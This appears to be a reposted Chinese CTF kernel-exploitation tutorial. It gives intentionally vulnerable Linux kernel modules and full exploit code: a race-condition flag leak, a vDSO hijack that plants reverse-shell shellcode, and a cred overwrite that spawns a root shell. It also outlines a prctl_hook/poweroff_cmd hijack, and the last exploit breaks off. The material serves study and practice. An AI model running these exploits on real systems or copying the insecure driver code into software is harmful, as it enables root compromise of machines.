> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270082.htm)

> [原创]Kernel 从 0 开始 (四)

前言
==

这里尝试各种各样的骚操作解法

[](#一、多线程的真条件竞争)一、多线程的真条件竞争
===========================

先给出自己编写的题目源码，参照多方题目，主要还是 0CTF2018-baby

```
#include #include #include #include #include #include #include #include #include #include //设备驱动常用变量
//static char *buffer_var = NULL;
static char *buffer_var = NULL;
static struct class *devClass; // Global variable for the device class
static struct cdev cdev;
static dev_t condition_dev_no;
 
 
struct flagStruct
{
    int len;
    char* flagUser;
};
 
 
 
static struct flagStruct* flagObj;
static char* flag = "flag{PIG007NBHH}";
 
static long condition_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
 
static int condition_open(struct inode *i, struct file *f);
 
static int condition_close(struct inode *i, struct file *f);
 
static bool chk_range_not_ok(ssize_t v1,ssize_t v2);
 
 
static struct file_operations condition_fops =
        {
                .owner = THIS_MODULE,
                .open = condition_open,
                .release = condition_close,
                .unlocked_ioctl = condition_ioctl
        };
 
// 设备驱动模块加载函数
static int __init condition_init(void)
{
    printk(KERN_INFO "[i] Module condition registered");
    if (alloc_chrdev_region(&condition_dev_no, 0, 1, "condition") < 0)
    {
        return -1;
    }
    if ((devClass = class_create(THIS_MODULE, "chardrv")) == NULL)
    {
        unregister_chrdev_region(condition_dev_no, 1);
        return -1;
    }
    if (device_create(devClass, NULL, condition_dev_no, NULL, "condition") == NULL)
    {
        printk(KERN_INFO "[i] Module condition error");
        class_destroy(devClass);
        unregister_chrdev_region(condition_dev_no, 1);
        return -1;
    }
    cdev_init(&cdev, &condition_fops);
    if (cdev_add(&cdev, condition_dev_no, 1) == -1)
    {
        device_destroy(devClass, condition_dev_no);
        class_destroy(devClass);
        unregister_chrdev_region(condition_dev_no, 1);
        return -1;
    }
 
    printk(KERN_INFO "[i] : <%d, %d>\n", MAJOR(condition_dev_no), MINOR(condition_dev_no));
    return 0;
 
}
 
// 设备驱动模块卸载函数
static void __exit condition_exit(void)
{
    // 释放占用的设备号
    unregister_chrdev_region(condition_dev_no, 1);
    cdev_del(&cdev);
}
 
 
 
 
// ioctl函数命令控制
long condition_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    int retval = 0;
    printk(KERN_INFO "Ioctl Get!\n");
    switch (cmd) {
        case 111: //doubleCon  //get flag_addr
            printk("Your flag is at %llx! But I don't think you know it's content\n",flag);
            break;
 
        case 222: //doubleCon  //print flag
            flagObj =  (struct flagStruct*)arg;
            ssize_t userFlagAddr = flagObj->flagUser;
            ssize_t userFlagObjAddr = (ssize_t)flagObj;
 
            if(chk_range_not_ok(userFlagAddr,flagObj->len)
                &&chk_range_not_ok(userFlagObjAddr,0)
                &&(flagObj->len == strlen(flag)))
 
            {
                if(!strncmp(flagObj->flagUser,flag,strlen(flag)))
                    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);
                else
                    printk("Wrong!");
                break;
            }
            else
            {
                printk("Wrong!\n");
                break;
            }
        default:
            retval = -1;
            break;
    }   
 
    return retval;
 
}
 
 
static bool chk_range_not_ok(ssize_t v1,ssize_t v2)
{
    if((v1 + v2) <= 0x7ffffffff000)
        return true;
    else
        return false;
}
 
static int condition_open(struct inode *i, struct file *f)
{
    printk(KERN_INFO "[i] Module condition: open()\n");
    return 0;
}
 
static int condition_close(struct inode *i, struct file *f)
{
    kfree(buffer_var);
    //buffer_var = NULL;
    printk(KERN_INFO "[i] Module condition: close()\n");
    return 0;
}
 
module_init(condition_init);
module_exit(condition_exit);
 
MODULE_LICENSE("GPL");
// MODULE_AUTHOR("blackndoor");
// MODULE_DESCRIPTION("Module vuln overflow"); 
```

### 前置知识

主要是线程的知识。

 

就是如果一个变量是全局的，那么在没有锁的情况就会导致一个程序的不同线程对该全局变量进行的竞争读写操作。就像这里给出的代码，首先 flag 在内核模块中是静态全局的：

```
static char* flag = "flag{PIG007NBHH}";
//--------------------------------------------------
if(chk_range_not_ok(userFlagAddr,flagObj->len)
   &&chk_range_not_ok(userFlagObjAddr,0)
   &&(flagObj->len == strlen(flag)))
 
{
    if(!strncmp(flagObj->flagUser,flag,strlen(flag)))
        printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);
    else
        printk("Wrong!");
    break;
}
else
{
    printk("Wrong!\n");
    break;
}

```

### 1. 检测：

先检测传入的数据的地址是否是在用户空间，长度是否为 flag 的长度，传入的所有数据是否处在用户空间。如果都是，再判断传入的数据与 flag 是否一致，一致则打印 flag，否则打印 Wrong 然后退出。

 

这么一看好像无法得到 flag，首先 flag 我们不知道，是硬编码在内核模块中的。其次就算无法传入内核模块中的地址，意味着就算我们获得了内核模块中 flag 的地址和长度，传进去也会判定失败。

### 2. 漏洞

但是这是建立在一个线程中的，如果是多个线程呢。在我们传入用户空间的某个数据地址和长度之后，先进入程序的 if 语句，也就是进入如下 if 语句

```
if(chk_range_not_ok(userFlagAddr,flagObj->len)
   &&chk_range_not_ok(userFlagObjAddr,0)
   &&(flagObj->len == strlen(flag)))

```

然后在检测 flag 数据之前，也就是如下 if 语句之前，启动另外一个线程把传入的该数据地址给改成内核模块的 flag 的数据地址，这样就能成功打印 flag 了。

```
if(!strncmp(flagObj->flagUser,flag,strlen(flag)))

```

那么就直接给出 POC，这里涉及到一些线程的操作，可以自己学习一下。

### POC

```
// gcc -static exp.c -lpthread -o exp
#include //char *strstr(const char *haystack, const char *needle);
//#define _GNU_SOURCE         /* See feature_test_macros(7) */
//char *strcasestr(const char *haystack, const char *needle);
#include #include #include #include #include #include #include #include #include #include #include #define TRYTIME 0x1000
 
 
struct flagStruct
{
    int len;
    char* flagUseAddr;
};
struct flagStruct flagChunk;
 
 
//open dev
int openDev(char* pos);
 
 
char readFlagBuf[0x1000+1]={0};
int finish =0;
unsigned long long flagKerneladdr;
void changeFlagAddr(void* arg);
 
int main(int argc, char *argv[])
{
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
 
    int devFD;
    int addrFD;
    unsigned long memOffset;
    pthread_t thread;
 
    //open Dev
    char* pos = "/dev/condition";
    devFD = openDev(pos);
 
    char flagBuf[16] = {0};
    flagReadFun(devFD,16,flagBuf);
 
 
    system("dmesg > /tmp/record.txt");
    addrFD = open("/tmp/record.txt",O_RDONLY);
    lseek(addrFD,-0x1000,SEEK_END);
    read(addrFD,readFlagBuf,0x1000);
    close(addrFD);
    int flagIdxInBuf;
    flagIdxInBuf = strstr(readFlagBuf,"Your flag is at ");
    if (flagIdxInBuf == 0){
        printf("[-]Not found addr");
        exit(-1);
    }
    else{
        flagIdxInBuf+=16;
        flagKerneladdr = strtoull(flagIdxInBuf,flagIdxInBuf+16,16);
        printf("[+]flag addr: %p\n",flagKerneladdr);
    }
 
    pthread_create(&thread, NULL, changeFlagAddr,&flagChunk);
    for(int i=0;iflagUseAddr = flagKerneladdr;
        flagPTChunk->flagUseAddr = flagKerneladdr;
    }
} 
```

最后如下效果：

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211019152917.png)

 

需要注意的是在 gcc 编译的时候需要加上`-lpthread`多线程的参数。还有线程的回调函数必须传入至少一个参数，不管该参数在里面有没有被用到。

 

**使用 userfaultfd 还不太会，之后再补。**

[](#二、任意读写漏洞)二、任意读写漏洞
=====================

内核里的读写漏洞利用方式与用户态有点不太一样，利用方式也是多种多样。

题目
--

首先给出下题目

```
#include #include #include #include #include #include #include #include #include #include //设备驱动常用变量
//static char *buffer_var = NULL;
static char *buffer_var = NULL;
static struct class *devClass; // Global variable for the device class
static struct cdev cdev;
static dev_t arbWriteModule_dev_no;
 
 
struct arbWriteNote
{
    ssize_t addr;
    ssize_t len;
    char* data;
};
 
 
static struct arbWriteNote* arbNoteObj;
 
 
 
static long arbWriteModule_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
 
static int arbWriteModule_open(struct inode *i, struct file *f);
 
static int arbWriteModule_close(struct inode *i, struct file *f);
 
 
 
static struct file_operations arbWriteModule_fops =
        {
                .owner = THIS_MODULE,
                .open = arbWriteModule_open,
                .release = arbWriteModule_close,
                .unlocked_ioctl = arbWriteModule_ioctl
        };
 
// 设备驱动模块加载函数
static int __init arbWriteModule_init(void)
{
    printk(KERN_INFO "[i] Module arbWriteModule registered");
    if (alloc_chrdev_region(&arbWriteModule_dev_no, 0, 1, "arbWriteModule") < 0)
    {
        return -1;
    }
    if ((devClass = class_create(THIS_MODULE, "chardrv")) == NULL)
    {
        unregister_chrdev_region(arbWriteModule_dev_no, 1);
        return -1;
    }
    if (device_create(devClass, NULL, arbWriteModule_dev_no, NULL, "arbWriteModule") == NULL)
    {
        printk(KERN_INFO "[i] Module arbWriteModule error");
        class_destroy(devClass);
        unregister_chrdev_region(arbWriteModule_dev_no, 1);
        return -1;
    }
    cdev_init(&cdev, &arbWriteModule_fops);
    if (cdev_add(&cdev, arbWriteModule_dev_no, 1) == -1)
    {
        device_destroy(devClass, arbWriteModule_dev_no);
        class_destroy(devClass);
        unregister_chrdev_region(arbWriteModule_dev_no, 1);
        return -1;
    }
 
    printk(KERN_INFO "[i] : <%d, %d>\n", MAJOR(arbWriteModule_dev_no), MINOR(arbWriteModule_dev_no));
    return 0;
 
}
 
// 设备驱动模块卸载函数
static void __exit arbWriteModule_exit(void)
{
    // 释放占用的设备号
    unregister_chrdev_region(arbWriteModule_dev_no, 1);
    cdev_del(&cdev);
}
 
 
 
 
// ioctl函数命令控制
long arbWriteModule_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    char* chunk = NULL;
    char* buf;
    int retval = 0;
    switch (cmd) {
        case 111: //arbRead
            printk("Arbitrarily read function!---111\n");
            arbNoteObj = (struct arbWriteNote*)arg;
            copy_to_user(arbNoteObj->data,(char*)arbNoteObj->addr,arbNoteObj->len);
            break;
 
        case 222: //arbWrite
            printk("Arbitrarily write function!---222\n");
            arbNoteObj = (struct arbWriteNote*)arg;
            buf = kmalloc(arbNoteObj->len,GFP_KERNEL);
            copy_from_user(buf,arbNoteObj->data,arbNoteObj->len);
            memcpy((char*)arbNoteObj->addr,buf,arbNoteObj->len);
            kfree(buf);
            break;
 
 
        default:
            retval = -1;
            break;
    }   
 
    return retval;
 
}
 
 
static int arbWriteModule_open(struct inode *i, struct file *f)
{
    printk(KERN_INFO "[i] Module arbWriteModule: open()\n");
    return 0;
}
 
static int arbWriteModule_close(struct inode *i, struct file *f)
{
    //kfree(buffer_var);
    //buffer_var = NULL;
    printk(KERN_INFO "[i] Module arbWriteModule: close()\n");
    return 0;
}
 
module_init(arbWriteModule_init);
module_exit(arbWriteModule_exit);
 
MODULE_LICENSE("GPL");
// MODULE_AUTHOR("blackndoor");
// MODULE_DESCRIPTION("Module vuln overflow"); 
```

可以看到传入一个结构体，包含数据指针和地址，直接任意读写。

不同劫持
----

### 1. 劫持 vdso

#### (1) 前置知识

vdso 的代码数据在内核里，当程序需要使用时，会将 vdso 的内核映射给进程，也就是相当于把内核空间的 vdso 原封不动地复制到用户空间，然后调用在用户空间的 vdso 代码。

 

如果我们能够将 vdso 给劫持为 shellcode，那么当具有 root 权限的程序调用 vdso 时，就会触发我们的 shellcode，而具有 root 权限的 shellcode 可想而知直接就可以。而 vdso 是经常会被调用的，所有只要我们劫持了 vdso，大概率都会运行到我们的 shellcode。

 

真实环境中 crontab 会调用 vdso 中的 gettimeofday，且是 root 权限的调用。

 

而 ctf 题目中就通常可以用一个小程序来模拟调用。

```
#include int main(){ 
    while(1)
    { 
        sleep(1); 
        gettimeofday(); 
    } 
} 
```

将这个程序编译后放到 init 中，用 nohup 挂起，即可做到 root 权限调用 gettimeofday：

```
nohup /gettimeofday &

```

#### (2) 获取地址

由于不同版本的 linux 内核中的 vdso 偏移不同，而题目给的 vmlinux 通常又没有符号表，所以需要我们自己利用任意读漏洞来测量。(如果题目没有任意读漏洞，建议可以自己编译一个对应版本的内核，然后自己写一个具备任意读的模块，加载之后测量即可，或者进行爆破，一般需要爆破一个半字节)

 

例如这里给出的代码示例，就可以通过如下代码来将 vdso 从内核中 dump 下来。不过这种方式 dump 的是映射到用户程序的 vdso，虽然内容是一样的，不过 vdso 在内核中的偏移却没有办法确定。

```
#include #include #include #include #include #include int main(){
    int test;
    size_t result=0;
    unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);
    result=memmem(sysinfo_ehdr,0x1000,"gettimeofday",12);
    printf("[+]VDSO : %p\n",sysinfo_ehdr);
    printf("[+]The offset of gettimeofday is : %x\n",result-sysinfo_ehdr);
    scanf("Wait! %d", test); 
    /*
    gdb break point at 0x400A36
    and then dump memory
    why only dump 0x1000 ???
    */
    if (sysinfo_ehdr!=0){
        for (int i=0;i<0x2000;i+=1){
            printf("%02x ",*(unsigned char *)(sysinfo_ehdr+i));
        }
    }
} 
```

这种方法的原理是通过寻找 gettimeofday 字符串来得到映射到程序中的 vdso 的内存页，如下：

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150019.png)

 

之后把下面的内容都复制，放到 CyberChef 中，利用 From Hex 功能得到二进制文件

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150220.png)

 

然后就将得到的文件放到 IDA 中，即可自动解析到对应 gettimeofday 函数相对于 vdso 的函数偏移。

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150335.png)

 

这里就当是 0xb20。

 

之后通过任意读，类似基于本题编写的以下代码，获取 vdso 相对于 vmlinux 基址的偏移。

```
#include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include struct arbWriteNote
{
    ssize_t addr;
    ssize_t len;
    char* data;
};
struct arbWriteNote arbWriteObj;
int get_gettimeofday_str_offset();
 
int main(int argc, char *argv[])
{
    int gettimeofday_str_offset = get_gettimeofday_str_offset();
    printf("gettimeofday str in vdso.so offset=0x%x\n",gettimeofday_str_offset);
    size_t vdso_addr = -1;
    for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {
        //读取一页数据
        arbitrary_read(devFD,0x1000,buf,addr);
        //如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址
        //之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页
        if (!strcmp(buf+gettimeofday_str_offset,"gettimeofday")) {
            printf("[+]find vdso.so!!\n");
            vdso_addr = addr;
            printf("[+]vdso in kernel addr=0x%lx\n",vdso_addr);
            break;
        }
    }
}
 
//获取vdso里的字符串"gettimeofday"相对vdso.so的偏移
int get_gettimeofday_str_offset() {
    //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx
    size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);
    char* name = "gettimeofday";
    if (!vdso_addr) {
        printf("[-]error get name's offset\n");
    }
    //仅需要搜索1页大小即可，因为vdso映射就一页0x1000
    size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));
    if (name_addr < 0) {
        printf("[-]error get name's offset\n");
    }
    return name_addr - vdso_addr;
} 
```

之后得到具体的地址

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150724.png)

 

那么最终的 gettimeofday 相对于 vmlinux 基地址就是

```
gettimeofday_addr = 0xffffffff81e04b20+0xb20

```

#### (3) 任意写劫持 gettimeofday

最终利用任意写，将 gettimeofday 函数的内容改为我们的 shellcode 即可

#### POC

```
// gcc -static exp.c -o exp
// ffffffff810a78d0 T SyS_gettimeofday
// ffffffff810a78d0 T sys_gettimeofday
// ffffffff810b08f0 T do_gettimeofday
// ffffffff810c7350 T compat_SyS_gettimeofday
// ffffffff810c7350 T compat_sys_gettimeofday
//0x13d
#include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #define GETTIMEOFDAY_FUN 0xB20
 
struct arbWriteNote
{
    ssize_t addr;
    ssize_t len;
    char* data;
};
struct arbWriteNote arbWriteObj;
 
 
//用于反弹shell的shellcode，127.0.0.1:3333
//或者在比赛中可以直接写类似Orw打开flag的shellcode
char shellcode[]="\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";
 
 
//open dev
int openDev(char* pos);
int get_gettimeofday_str_offset();
 
int main(int argc, char *argv[])
{
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
 
    int devFD;
    int addrFD;
    unsigned long memOffset;
    pthread_t thread;
 
    //open Dev
    char* pos = "/dev/arbWriteModule";
    devFD = openDev(pos);
 
 
 
   char *buf = (char *)calloc(1,0x1000);
 
 
   int gettimeofday_str_offset = get_gettimeofday_str_offset();
   printf("gettimeofday str in vdso.so offset=0x%x\n",gettimeofday_str_offset);
   size_t vdso_addr = -1;
   for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {
      //读取一页数据
      arbitrary_read(devFD,0x1000,buf,addr);
      //如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址
      //之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页
      if (!strcmp(buf+gettimeofday_str_offset,"gettimeofday")) {
         printf("[+]find vdso.so!!\n");
         vdso_addr = addr;
         printf("[+]vdso in kernel addr=0x%lx\n",vdso_addr);
         break;
      }
   }
   if (vdso_addr == -1) {
      printf("[-]can't find vdso.so!!\n");
   }
   size_t gettimeofday_addr = vdso_addr + GETTIMEOFDAY_FUN;
   printf("[+]gettimeofday function in kernel addr=0x%lx\n",gettimeofday_addr);
   //将gettimeofday处写入我们的shellcode，因为写操作在内核驱动里完成，内核可以读写执行vdso
   //用户只能读和执行vdso
   arbitrary_write(devFD,strlen(shellcode),shellcode,gettimeofday_addr);
   sleep(1);
   printf("[+]open a shell\n");
   system("nc -lvnp 3333");
   return 0;
}
 
 
int openDev(char* pos){
    int devFD;
    printf("[+] Open %s...\n",pos);
    if ((devFD = open(pos, O_RDWR)) < 0) {
        printf("    Can't open device file: %s\n",pos);
        exit(1);
    }
    return devFD;
}
 
 
//获取vdso里的字符串"gettimeofday"相对vdso.so的偏移
int get_gettimeofday_str_offset() {
   //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx
   size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);
   char* name = "gettimeofday";
   if (!vdso_addr) {
      printf("[-]error get name's offset\n");
   }
   //仅需要搜索1页大小即可，因为vdso映射就一页0x1000
   size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));
   if (name_addr < 0) {
      printf("[-]error get name's offset\n");
   }
   return name_addr - vdso_addr;
}
 
void arbitrary_read(int devFD,int len,char *buf,size_t addr)
{
    arbWriteObj.len = len;
    arbWriteObj.data = buf;
    arbWriteObj.addr = addr;
    ioctl(devFD,111,&arbWriteObj);
}
 
void arbitrary_write(int devFD,int len,char *buf,size_t addr)
{
    arbWriteObj.len = len;
    arbWriteObj.data = buf;
    arbWriteObj.addr = addr;
    ioctl(devFD,222,&arbWriteObj);
} 
```

参考：

 

[(15 条消息) linux kernel pwn 学习之劫持 vdso_seaaseesa 的博客 - CSDN 博客](https://blog.csdn.net/seaaseesa/article/details/104694219?ops_request_misc=%7B%22request%5Fid%22%3A%22163469082516780357227209%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=163469082516780357227209&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-7-104694219.pc_v2_rank_blog_default&utm_term=kernel&spm=1018.2226.3001.4450)

 

还有 bsauce 师傅的简书：https://www.jianshu.com/p/07994f8b2bb0

### 2. 劫持 cred 结构体

#### (1) 前置知识

这个没啥好讲的，就是覆盖 uig 和 gid 为零蛋就行，唯一需要的就是寻找 cred 的地址。

#### (2) 寻找地址

##### [](#①利用prctl函数)①利用 prctl 函数

task_srtuct 结构体是每个进程都会创建的一个结构体，保存当前进程的很多内容，其中就包括当前进程的 cred 结构体指针。

```
//version 4.4.72
 
struct task_struct {
    //............................................
/* process credentials */
    const struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */
    const struct cred __rcu *real_cred; /* objective and real subjective task
                     * credentials (COW) */
    const struct cred __rcu *cred;    /* effective (overridable) subjective task
                     * credentials (COW) */
    char comm[TASK_COMM_LEN]; /* executable name excluding path
                     - access with [gs]et_task_comm (which lock
                       it with task_lock())
                     - initialized normally by setup_new_exec */
    //............................................
}

```

给出的题目编译在 4.4.72 内核下。

 

也就是可以将 comm[TASK_COMM_LEN] 设置为指定的字符串，相当于打个标记，不过不同版本中可能有所不同，不如最新版本 V5.14.13 的 Linux 内核就有所不同，其中还加了一个 key 结构体指针：

```
//version 5.14.13
 
struct task_struct {
    //............................................
#ifdef CONFIG_THREAD_INFO_IN_TASK
    /*
     * For reasons of header soup (see current_thread_info()), this
     * must be the first element of task_struct.
     */
    stru/* Tracer's credentials at attach: */
    const struct cred __rcu        *ptracer_cred;
 
    /* Objective and real subjective task credentials (COW): */
    const struct cred __rcu        *real_cred;
 
    /* Effective (overridable) subjective task credentials (COW): */
    const struct cred __rcu        *cred;
 
#ifdef CONFIG_KEYS
    /* Cached requested key. */
    struct key            *cached_requested_key;
#endif
 
    /*
     * executable name, excluding path.
     *
     * - normally initialized setup_new_exec()
     * - access it with [gs]et_task_comm()
     * - lock it with task_lock()
     */
    char                comm[TASK_COMM_LEN];
    //............................................
 
}

```

然后就可以利用 prctl 函数的 PR_SET_NAME 功能来设置 task_struct 结构体中的 comm[TASK_COMM_LEN] 成员。

```
char target[16];
strcpy(target,"tryToFindPIG007");
prctl(PR_SET_NAME,target);

```

##### [](#②内存搜索定位)②内存搜索定位

通过内存搜索，比对我们输入的标记字符串，可以定位 comm[TASK_COMM_LEN] 成员地址，比如设置标记字符串为 "tryToFindPIG007":

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020162844.png)

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020162934.png)

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020163051.png)

 

可以查看当前 Cred 结构中的内容：

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020163136.png)

```
//search target chr
char *buf = (char *)calloc(1,0x1000);
puts("[+] we can read and write any memory");
for(;addr<0xffffc80000000000;addr+=0x1000){
    arbitrary_read(devFD,0x1000,buf,addr);
    result=memmem(buf,0x1000,target,16);
    if (result){
        printf("result:%p\n",result);
        cred= * (size_t *)(result-0x8);
        real_cred= *(size_t *)(result-0x10);
        // if ((cred||0xff00000000000000) && (real_cred == cred))
        // {
        target_addr=addr+result-(int)(buf);
        printf("[+]found task_struct 0x%lx\n",target_addr);
        printf("[+]found cred 0x%lx\n",real_cred);
        break;
        // }
    }
}

```

##### [](#③任意写劫持cred)③任意写劫持 cred

这个就不多说了，获取到 cred 地址之后直接写就行了

#### POC

```
// gcc -static exp.c -o exp
#include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include struct arbWriteNote
{
    ssize_t addr;
    ssize_t len;
    char* data;
};
struct arbWriteNote arbWriteObj;
 
 
 
//open dev
int openDev(char* pos);
 
int main(int argc, char *argv[])
{
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
 
    int devFD;
    int addrFD;
    unsigned long memOffset;
    size_t addr=0xffff880000000000;
    size_t cred=0;
    size_t real_cred=0;
    size_t target_addr;
    size_t result=0;
    char root_cred[28] = {0};
 
    //set comm[TASK_COMM_LEN]
    char target[16];
    strcpy(target,"tryToFindPIG007");
    prctl(PR_SET_NAME,target);
 
    //open Dev
    char* pos = "/dev/arbWriteModule";
    devFD = openDev(pos);
 
    //search target chr
    char *buf = (char *)calloc(1,0x1000);
    puts("[+] we can read and write any memory");
    for(;addr<0xffffc80000000000;addr+=0x1000){
        arbitrary_read(devFD,0x1000,buf,addr);
        result=memmem(buf,0x1000,target,16);
        if (result){
            printf("result:%p\n",result);
            cred= * (size_t *)(result-0x8);
            real_cred= *(size_t *)(result-0x10);
            // if ((cred||0xff00000000000000) && (real_cred == cred))
            // {
            target_addr=addr+result-(int)(buf);
            printf("[+]found task_struct 0x%lx\n",target_addr);
            printf("[+]found cred 0x%lx\n",real_cred);
            break;
            // }
        }
    }
    if (result==0)
    {
        puts("not found , try again ");
        exit(-1);
    }
 
    arbitrary_write(devFD,28,root_cred,real_cred);
 
    if (getuid()==0){
        printf("[+]now you are r00t,enjoy ur shell\n");
        system("/bin/sh");
    }
    else
    {
        puts("[-] there must be something error ... ");
        exit(-1);
    }
 
 
 
   return 0;
}
 
 
int openDev(char* pos){
    int devFD;
    printf("[+] Open %s...\n",pos);
    if ((devFD = open(pos, O_RDWR)) < 0) {
        printf("    Can't open device file: %s\n",pos);
        exit(1);
    }
    return devFD;
}
 
 
 
void arbitrary_read(int devFD,int len,char *buf,size_t addr)
{
    arbWriteObj.len = len;
    arbWriteObj.data = buf;
    arbWriteObj.addr = addr;
    ioctl(devFD,111,&arbWriteObj);
}
 
void arbitrary_write(int devFD,int len,char *buf,size_t addr)
{
    arbWriteObj.len = len;
    arbWriteObj.data = buf;
    arbWriteObj.addr = addr;
    ioctl(devFD,222,&arbWriteObj);
} 
```

#### [](#▲注意事项)▲注意事项

不过这个如果不加判断 `if ((cred||0xff00000000000000) && (real_cred == cred))`搜索出来的 cred 可能就不是当前进程，具有一定概率性，具体原因不知，可能是搜索到了用户进程下的字符串？

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020165201.png)

### 3. 劫持 prctl 函数

#### (1) 函数调用链

`prctl`->`security_task_prctl`->`*prctl_hook`

 

`orderly_poweroff`->`__orderly_poweroff`->`run_cmd(poweroff_cmd)`-> `call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)`

#### (2) 前置知识

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021000904.png)

 

原本 capability_hooks+440 存放的是 cap_task_prctl 的地址

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021001258.png)

 

但是经过我们的劫持之后存放的是 orderly_poweroff 的地址

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021001355.png)

 

之前讲的 prctl_hook 指的就是 capability_hooks+440。

 

这样劫持之后我们就能调用到 orderly_poweroff 函数了。

 

而 orderly_poweroff 函数中会调用实际__orderly_poweroff 函数，有如下代码

```
//version 4.4.72
static int __orderly_poweroff(bool force)
{
    int ret;
 
    ret = run_cmd(poweroff_cmd);
 
    if (ret && force) {
        pr_warn("Failed to start orderly shutdown: forcing the issue\n");
 
        /*
         * I guess this should try to kick off some daemon to sync and
         * poweroff asap.  Or not even bother syncing if we're doing an
         * emergency shutdown?
         */
        emergency_sync();
        kernel_power_off();
    }
 
    return ret;
}

```

这里就调用到 run_cmd(poweroff_cmd)，而 run_cmd 函数有如下代码

```
//version 4.4.72
static int run_cmd(const char *cmd)
{
    char **argv;
    static char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };
    int ret;
    argv = argv_split(GFP_KERNEL, cmd, NULL);
    if (argv) {
        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        argv_free(argv);
    } else {
        ret = -ENOMEM;
    }
 
    return ret;
}

```

这里就调用到 call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)，这里的参数 rdi 中就是

 

poweroff_cmd。所以如果我们可以劫持 poweroff_cmd 为我们的程序名字字符串，那么就可以调用 call_usermodehelpe 函数来启动我们的程序。而 poweroff_cmd 是一个全局变量，可以直接获取地址进行修改。

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021002640.png)

 

而 call_usermodehelpe 函数启动程序时是以 root 权限启动的，所以如果我们的程序运行 / bin/sh 且以 root 权限启动，那么就完成了提权。

#### (3) 获取地址

##### [](#①prctl_hook)①prctl_hook

可以通过编写一个小程序，然后给`security_task_prctl`函数下断点，运行到`call QWORD PTR[rbx+0x18]`即可看到对应的 rbx+0x18 上存放的地址，将其修改为`orderly_poweroff`函数即可。

##### [](#②poweroff_cmd、orderly_poweroff)②poweroff_cmd、orderly_poweroff

可以直接使用 nm 命令来获取，或者直接进入 gdb 打印即可。

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021105503.png)

 

此外 orderly_poweroff 也是一样的获取。如果无法查到，那么可以启动 qemu，先设置为 root 权限后

 

`cat /proc/kallsyms | grep "orderly_poweroff"`即可，或者编译一个对应版本的内核进行查询。

 

![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211021105603.png)

 

▲最后 fork 一个子进程来触发反弹 shell 即可

#### POC

```
// gcc -static exp.c -o exp
 
//ffffffff812adb90 T security_task_prctl
 
 
